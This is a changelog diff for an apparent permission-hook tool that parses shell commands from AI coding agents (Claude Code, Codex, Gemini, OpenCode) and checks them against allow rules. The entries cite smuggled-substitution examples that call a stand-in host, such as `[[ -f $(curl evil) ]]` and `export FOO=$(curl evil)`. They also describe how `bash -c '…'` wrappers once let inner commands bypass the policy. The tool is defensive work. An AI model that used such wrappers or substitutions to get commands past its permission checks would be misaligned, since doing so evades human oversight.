@@ -6,6 +6,10 @@ All notable changes to this project are documented in this file. Format follows 
 
 ### Added
 
+- Shell parser now traverses control-flow constructs and treats them as transparent. `if … then … fi`, `while`/`until` loops, `case` statements, brace groups (`{ …; }`), subshells (`( … )`), function definitions, and `! cmd` negation are all decomposed into their inner commands and each segment evaluated against policy. The original failing case — `if [ -f x ]; then sed -n '1,220p' x; fi` with `Bash(sed:*)` allowed — now returns `Allow` instead of `Ask`.
+- Substitution defense extended across the new traversal surface: `[[ -f $(…) ]]`, `case $(…) in …`, `for f in $(…); do …; done` (also `select`, `<(…)`), `for f in $(curl evil); do …`, and unquoted heredoc bodies containing `$(…)` all parse as unparseable → `Ask`. Command/process substitutions inside subjects, patterns, iterables, predicates, or heredoc bodies execute before the wrapping construct runs, so swallowing them silently would let `[[ -f $(curl evil) ]]` bypass policy.
+- `declaration_command` (`export FOO=bar`, `local`, `declare`, `readonly`, `typeset`) parses as a regular segment with the keyword as `argv[0]`, so `Bash(export:*)` rules now match. Substitution-bearing forms (`export FOO=$(curl evil)`) remain unparseable → `Ask`.
+- Heredoc redirects (`<<EOF`) are recognised and dropped from the redirect list (input-only, no file write).
 - `install` subcommand wires the bridge into Claude Code (`PreToolUse`), Codex (`PreToolUse` + `PermissionRequest`), Gemini (`BeforeTool`), and OpenCode (`permission.ask` plugin shim). `--mode auto` (default) uses `~/.rulesync/hooks.json` as the source of truth when `~/.rulesync/` exists; else falls back to writing per-tool configs (`~/.claude/settings.json`, `~/.codex/hooks.json`+`config.toml`, `~/.gemini/settings.json`) directly. The OpenCode plugin is always installed directly because rulesync has no schema for `permission.ask` plugins.
 - `install --dry-run` previews changes without writing.
 - `install` strips stale bridge entries from Claude's `permissionRequest` block — Claude doesn't fire that event, but older configs sometimes contain a leftover entry there.
@@ -19,6 +23,7 @@ All notable changes to this project are documented in this file. Format follows 
 
 ### Fixed
 
+- Shell parser now correctly handles tree-sitter-bash's habit of (a) folding trailing positional argv into the preceding `file_redirect` node and (b) wrapping any compound left-hand side under a single `list` child of `redirected_statement`. ``wc -l a.py 2>/dev/null b.py`` previously parsed as "writes to 'b.py'"; ``cmd1 && cmd2 2>/dev/null path`` previously bailed with "unsupported redirected statement part 'list'". Both now match bash semantics — redirects bind to the last segment, spillover words rejoin its argv.
 - Shell parser now recursively unwraps `bash -c '…'` (single-quoted) and `bash -c $'…'` (ANSI-C) wrappers. tree-sitter-bash exposes these as `raw_string` / `ansi_c_string` leaves with no named children, so the previous walk produced an empty argv and the inner command bypassed policy entirely. Double-quoted `bash -c "…"` was already handled.
 - Bridge ownership check is now a strict basename match against the resolved binary plus a leading `check` subcommand, parsed via `shlex.split`. Substring matching could falsely strip neighbour tools whose paths happened to contain `agentperms`.
 - Embedded bridge invocation is now `shlex.quote`d so paths containing spaces or shell metacharacters (e.g. `~/Library/Application Support/...`) no longer break the hook command line.
